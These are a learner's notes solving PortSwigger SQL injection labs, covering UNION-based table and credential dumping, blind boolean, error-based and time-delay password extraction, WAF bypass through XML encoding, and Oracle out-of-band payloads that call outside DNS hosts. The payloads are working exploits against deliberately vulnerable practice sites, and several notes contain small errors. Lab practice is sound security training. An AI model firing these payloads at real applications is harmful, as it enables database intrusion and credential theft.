# SQLi labs

---

## 📚 Sources

[SQL Injection Tutorial | Web Security Academy](https://portswigger.net/web-security/sql-injection)

sql sheet common db payloads--> [SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

### Category: *In-Band*

Query used in website backend

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Test to impilicate behavoir of website

```url
web-security-academy.net/filter?category='"
```

`Internal Server Error` and this error indicate it's injuctable with sqli and not protected

`'` gives error and `"` doesn't give error so query values using `''`

we want display one or more unreleased products

```sql
' OR 1=1 --
```

this payload will make `WHERE` alaways true so it will return all stuff and comment reset of code.

---

## [Lab: SQL injection vulnerability allowing login bypass | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

### Category: *In-Band-Authentication Bypass*

we need to login with `administrator` user

> note: data doesn't pass as link paramters it's in request body

`"'` in input parameter return `Internal Server Error` so it injectable with SQLI

`'` used in query with data

our payload will be

```sql
administrator' and 1=1 --
```

---

## [Lab: SQL injection with filter bypass via XML encoding | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

**Target:** retrieve the admin user's credentials, then log in to their account.

objective:  `users` table have users data.

- category number send in xml format in `/product/stock`

- request with `1+1` in xml accepted and return valid respense

- **`1 OR 1=1 --`  detected** as sqli attack because of WAF (Web Application Firewall)

- encode data as **hexa-entity** using hackvisity extension in burp work fine and pass the WAF

- number of sets in select is 1 `UNION select NULL --`  

- `SELECT version()` indicate database is PostgreSQL 

- `productId` can't retreve data in users table try `storeId` 

- `1 UNION SELECT password || '~' || username FROM users` the crafted payload || concatenate colums because there is only one colum available.

---

## [Lab: SQL injection attack, querying the database type and version on Oracle | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

**Target:** get database type and version

- `web-security-academy.net/filter?category=` the vulnrable parameter.

- query use `'` with value.

- web app return **server error** of query is **wrong**.

- `category=Pets' UNION SELECT NULL, NULL FROM dual --` indicate: 
  
  - database is **oracle**, (**require** `FROM` and `dual` used as **default table**).
  
  - number of **colums are 2** `NULL, NULL`

- `Pets' union select banner,null from v$version --` crafted payload.

- see [SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet) for how to get version in all DBs.

---

## [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

**Target:** get database type and version 

- `web-security-academy.net/filter?category=` the vulnrable parameter.

- query use `'` with value.

- `category=Pets' -- ;` DB is **MySQL**, (**Only** one need space after `--`).

- `Pets' UNION SELECT NULL, NULL -- ;` first query select **two colums**.

- `Pets' UNION SELECT @@version, NULL -- ;` the crafted query return database version.

---

## [Lab: SQL injection attack, listing the database contents on non-Oracle databases | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

**Target:** log in as the administrator user. 

- `web-security-academy.net/filter?category=` the vulnrable parameter.

- query use `'` with value.

- `' UNION SELECT NULL, NULL --` DB select **2 colums**.

- `' UNION SELECT NULL, NULL /*comment*/ --` DB is Microsoft or PostgreSQL.

- `' UNION SELECT version(), NULL --` DB is PostgreSQL.

- `' UNION SELECT table_name, NULL FROM information_schema.tables --` will retrive table names for PostgreSQL `table_name` colum has all tables names

- `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ubqycm' --` will return column names. for table have users. 

- `' UNION SELECT username_gcjtjo, password_ficcly from users_ubqycm --` will show all users data

---

## [Lab: SQL injection attack, listing the database contents on Oracle | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

**Target:** log in as the administrator user.

- `web-security-academy.net/filter?category=` the vulnrable parameter.

- query use `'` with value.

- `' \*comment*\ --` -> 500 server Error 
  
  - DB is **oracle** (only one doesn't accept `\*comment*\`as a comment).

- `' UNION SELECT NULL, NULL FROM dual --` -> 200 OK
  
  - SELECT use **2 columns**.

- `' UNION SELECT table_name, NULL FROM all_tables --` -> 200 Ok
  
  - return all tables in DB.
  
  - users may in table is `APP_USERS_AND_ROLES` table.

- `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES' --` -> 200 OK 
  
  - Columns used are **GUID ISROLE NAME**

- `' UNION SELECT NULL, NULL FROM APP_USERS_AND_ROLES --` -> 500 Server Error 
  
  - see for other table named users

- `' UNION SELECT table_name, NULL FROM all_tables --`
  
  - **USERS_ZJGSEV** maybe users table

- `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ZJGSEV' --` -> 200 OK
  
  - **EMAIL, PASSWORD_DCJTYH, USERNAME_SHVXSD** columns for this table

- `' UNION SELECT USERNAME_SHVXSD, PASSWORD_DCJTYH FROM USERS_ZJGSEV --` -> 200 OK
  
  - show all users data **(our targter)**.

---

## [Lab: SQL injection UNION attack, determining the number of columns returned by the query | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

**Target:** determine the number of columns returned by the query

- SQL injection vulnerability in the product category filter.

- `' /*comment*/ --` -> 200 OK  
  
  - DB is **not Oracle** .

- `' #` -> 500 Server Error
  
  - DB is Microsoft or PostgreSQL.

- `' UNION SELECT NULL, NULL, NULL --` -> 200 OK 
  
  - query select 3 columns (Target Located)

---

## [Lab: SQL injection UNION attack, finding a column containing text | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

**Target:** identify a column that is compatible with string data (column has same datatype), using string provided in lab

union need columns to have same datatype

`web-security-academy.net/filter?category=` the vulnrable parameter with SQLI.

- C8luiA is the string to test with.

- `' /**/ --` ->  200 OK  AND `' #--` -> 500 Server Error.
  
  - DB is **Microsoft or PostgreSQL**. no need for **FROM** identify.

- `' UNION SELECT NULL, NULL, NULL --` query SELECT **3 Columns**.

- `' UNION SELECT 'C8luiA', NULL, NULL --` -> 500 Server Error
  
  - first colum datatype not string 

- `' UNION SELECT NULL, 'C8luiA', NULL --` -> 200 OK 
  
  - second column datatype is string **(Our Target)**

- `' UNION SELECT NULL, NULL, 'C8luiA' --` -> 500 OK 
  
  - thrid column datatype is not strind 

---

## [Lab: SQL injection UNION attack, retrieving data from other tables | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

**Target:** log in as the `administrator` user.

`web-security-academy.net/filter?category=` the vulnrable parameter with SQLI.

DB contains, table called `users`, with columns called `username` and `password`.

- `' /**/ --` -> 200 OK AND `' #--` -> 500 Server Error.
  
  - DB is **Microsoft or PostgreSQL**. no need for **FROM** identify.

- `' UNION SELECT NULL, NULL --` -> 200 OK
  
  - query select **2 columns** 

- `' UNION SELECT username, password from users --`  -> 200 OK
  
  - return all users data include administrator **(our Habibi)**.

---

## [Lab: SQL injection UNION attack, retrieving multiple values in a single column | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

**Target:** log in as the `administrator` user.

`web-security-academy.net/filter?category=` the vulnrable parameter with SQLI.

DB contains, table called `users`, with columns called `username` and `password`.

- `' /**/ --` -> 200 OK AND `' #--` -> 500 Server Error.
  
  - DB is **Microsoft or PostgreSQL**. no need for **FROM** identify.

- `' UNION SELECT NULL, NULL --` -> 200 OK
  
  - query select **2 columns**.

- `' union select username, password from users --` -> 500 server Error
  
  - may there is confilict in datatypes

- `' union select NULL, 'sdada' from users --` -> 200 OK
  
  - seconed column datatype is string.

- `' union select 'sdada', NULL from users --` -> 500 server error
  
  - seconed column datatype not string **(makes confilict)**.

- `' union select NULL, username || '~' || password from users --` -> 200 OK
  
  - show all users data **(target located)**.
  
  - DB is **PostgreSQL** (note that it use `||` in concatinate Microsoft use `+`).

---

## [Lab: Blind SQL injection with conditional responses | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)   *try python script*

application uses a tracking cookie for analytics

The database contains a different table called `users`, with columns called `username` and `password` 

- `category` prameter and request body in form not vulnarable.

- `Cookie: TrackingId=Mmw4JoCqtHFaEmUF'` -> 200 OK 
  
  - is vulnarable with sqli (make welcome message dissapear).
  
  - if query is correct welcome message  appear.

- `Cookie: TrackingId=Mmw4JoCqtHFaEmUF' AND '1'='1` -> `Welcome back` message appears.

- `Cookie: TrackingId=Mmw4JoCqtHFaEmUF' AND '1'='2` -> `Welcome back` message does not appear
  
  - `Cookie: TrackingId=` is vulnarable with blind sqli (`Welcome back` message the indicator )

- `' AND (select '1' from users)='1` -> false
  
  - subquery return more than one row this mean more '1' which return 0 rows

- `' AND (select '1' from users limit 1)='1`-> true
  
  - `limit 1` return one row mean one '1' to compare with.

- `' AND (select '1' from users where username='administrator' limit 1)='1` -> true
  
  - there is a username called `administrator`.

- `' AND (select '1' from users where username='administrator' and length(password)=20 limit 1)='1` -> true
  
  - password length is bigger than 1.

- `' AND (select '1' from users where username='administrator' and length(password)=20 limit 1)='1` -> true
  
  - password is 20 charcter along.

- `' AND (SELECT SUBSTRING(password,1,20) FROM users WHERE username='administrator')='a` 
  
  - payload to get passoword one by one 
  
  - add mark in place of `a` use a list number 0-9 and a-z
  
  - in place of `20` in  `SUBSTRING(password,1,20)` start from 1 and increament by 1 after get the charcter and add it before attack placeholde (was `a`).

- password retreived by introduer tab `l1ee6217ch30hs5vrqq1` get by run sniper attack with pause when find message welcome again in response.

---

## [Lab: Blind SQL injection with conditional errors | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

application uses a tracking cookie for analytics

The database contains a different table called `users`, with columns called `username` and `password`

- `category` prameter and request body in form not vulnarable.

- `Cookie: TrackingId=Mmw4JoCqtHFaEmUF'` -> 500 internal server error
  
  - is vulnarable with sqli (cause error message).
  
  - error happen only if query is wrong 

- `' AND (select 's')='s` -> 500 error 

- `' AND (select 's' from dual)='s` -> 200 OK
  
  - DB is **oracle** (needs to specify a table).

- `' AND  (select 's' from users where rownum=1)='s` 
  
  - there is a table called users 
  
  - `rownum` like `limit` in other DBs to return only one `'s'`.

- `' AND (select 's' from users where rownum=1 and username='administrator')='s` -> 200 OK
  
  - there is a username called `administrator`.

- `'||(SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` 
  
  - if condation true response return 500 internal error (because of `TO_CHAR(1/0)`)
  
  - if condation false responese will be 200 OK

- `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND rownum=1)||'` -> 500 internal server error 
  
  - there is a username called `administrator` inside `users` table. 

- `'||(SELECT CASE WHEN (length(password)>1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and rownum=1)||'` -> 500 internal server error
  
  - filter we will use to determine password length 

- `'||(SELECT CASE WHEN (length(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and rownum=1)||'` -> 500 internal server error
  
  - password length **20 charcter**.

- `'||(SELECT CASE WHEN (SUBSTR(password,1,20)='eun48a95qd1jwjxnzdzw') THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and rownum=1)||'`
  
  - this how to get password our target char by char `eun48a95qd1jwjxnzdzw`.

---

## [Lab: Visible error-based SQL injection | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

application uses a tracking cookie for analytics

The database contains a different table called `users`, with columns called `username` and `password`

- `category` prameter and request body in form not vulnarable.

- `Cookie: TrackingId=Mmw4JoCqtHFaEmUF'` -> 500 internal server error
  
  - is vulnarable with sqli (cause error message).
  
  - it return the error message to website 

- `' AND (select '2' from users limit(1))='2)` -> 200 OK
  
  - DB is not oracle 
  
  - there is a table called users 

`' AND 1=CAST((SELECT username FROM users) AS int) --`

- 500 server error 

- Cause is the response truncation after a specific length (delete id we don't need it).

`TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`

- there is more than one row as excepted -> table users exist 

- 500 server error 

`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

- 500 server error

- this return usrname value `administrator` (which we need)

`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

- 500 server error 

- this return password for `administrator` which is the first row (now go and login)

---

## [Lab: Blind SQL injection with time delays | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

Target: make a delay 10 seconds

Anlysis Exepted query is: 

```sql
SELECT * FROM tracking WHERE id='<value>'
```

`' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --`

- no delay happend, DB not postgreSQL

`' AND (IF (1=1) WAITFOR DELAY '0:0:10') --`

- no delay happend, DB not MIcrosoft

`' AND (SELECT IF(1=1,SLEEP(10),'a')) --`

- no delay happend, DB not Mysql

`' AND (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual) --` 

- no delay happend, DB not Mysql. may problem in me :) 

`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --`

- delay happend and lab solved (Target Down).

` <boolean> AND <boolean> `

- `AND` excute the L.H.S Only because it false the other side not be excuted 

`' || <command> || --` 

- this work because it merge all results togther (excute our payload) 

`'|| pg_sleep(10) --`

- no need to condation cammands work fine now.

---

## [Lab: Blind SQL injection with time delays and information retrieval | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

Target: Login with administrator data

application uses a tracking cookie for analytics

The database contains a different table called `users`, with columns called `username` and `password`

`'%3b+SELECT+pg_sleep(10)+--`

- `'; SELECT pg_sleep(10) --` and encode to url encode key charcatars.

- made a delay then DB is postgresql

`'; SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --`

- encode url 

- make delay 

`' ; SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users where username='administrator' --`

- make delay 

- there is administrator

`' ; SELECT CASE WHEN(password like 'a%') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users where username='administrator' --`

- this will return password using sniper attack in intruder make the payload in place of a and each response take more than 1 minute it's char is part of password 

`' ; SELECT CASE WHEN(password like '02ob8m3fcgs6rlv6w35w%') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users where username='administrator' --`

- and this is our password

- now login with this creadantal 

---

## [Lab: Blind SQL injection with out-of-band interaction | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

TrachingId is the vulnarable cookie with sqli

server work **Asynchronous** so **Time Based sqli**, won't work -> *to close Time Based make server work Asynchronous*.

Target - send DNS lookup to indicate a PoC 

[https://canarytokens.org/generate](https://canarytokens.org/generate)

- as we use free version in burbsuite, this make a unique subdomain for you.

- choose **DNS** and write your email and alert message.

- save the subdomain you got

- it send alert in email you enterd  if someone lookup for this subdomain

All Payloads used from portswiger [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

`' UNION SELECT UTL_INADDR.get_host_address('http://bgk826pq41q7yp922alzpblzb.canarytokens.com') --`

- this payload send with URL encode key charcters.

- no DNS look up happen -> DB not fully pached oracle

`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://bgk826pq41q7yp922alzpblzb.canarytokens.com/"> %remote;]>'),'/l') FROM dual --`

- payload send with URL Encoded key charcters.

- dns look up doesn't happen -> no email send.

`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xyz789abcdef.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--`

- payload send with URL encoded key charcter

- lab solved -> nslookup happend.

- as we know **burpcollaborator** generate a random subdomains i used a random value.

portswigger maybe set outbbound firewall to accepts only out-bond connection to `.burpcollaborator.net` and block others connections `*` which prevent payload that use subdomain from canary from working. *this mentioned in note section inside lab i didn't read it :)*.

DNS used because it allowed in all restriceted enviroments so i can send requests easly
